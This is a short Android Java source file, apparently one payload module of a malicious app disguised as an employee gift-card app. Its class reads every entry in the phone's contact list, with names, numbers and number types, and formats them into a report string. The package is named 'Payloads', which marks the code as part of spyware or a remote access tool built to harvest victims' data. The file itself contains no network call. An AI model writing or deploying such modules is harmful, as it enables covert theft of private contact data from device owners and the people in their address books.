package com.employee.giftcard.Payloads;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class readContacts {
    Context context;
    
    public readContacts(Context context) {
        this.context = context;
    }
    
    public String getContacts() {
        StringBuilder contacts = new StringBuilder();
        Cursor cursor = null;
        
        try {
            cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.getCount() > 0) {
                contacts.append("=== CONTACTS ===\n");
                contacts.append("Total contacts: ").append(cursor.getCount()).append("\n\n");
                
                while (cursor.moveToNext()) {
                    String name = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    );
                    String phoneNumber = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    );
                    String phoneType = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE)
                    );
                    
                    contacts.append("Name: ").append(name != null ? name : "Unknown").append("\n");
                    contacts.append("Number: ").append(phoneNumber != null ? phoneNumber : "No number").append("\n");
                    contacts.append("Type: ").append(getPhoneType(phoneType)).append("\n");
                    contacts.append("---\n");
                }
            } else {
                contacts.append("No contacts found\n");
            }
        } catch (Exception e) {
            contacts.append("Error reading contacts: ").append(e.getMessage()).append("\n");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return contacts.toString();
    }
    
    private String getPhoneType(String type) {
        if (type == null) return "Unknown";
        
        switch (type) {
            case "1": return "Home";
            case "2": return "Mobile";
            case "3": return "Work";
            case "4": return "Fax Work";
            case "5": return "Fax Home";
            case "6": return "Pager";
            case "7": return "Other";
            default: return "Custom";
        }
    }
}
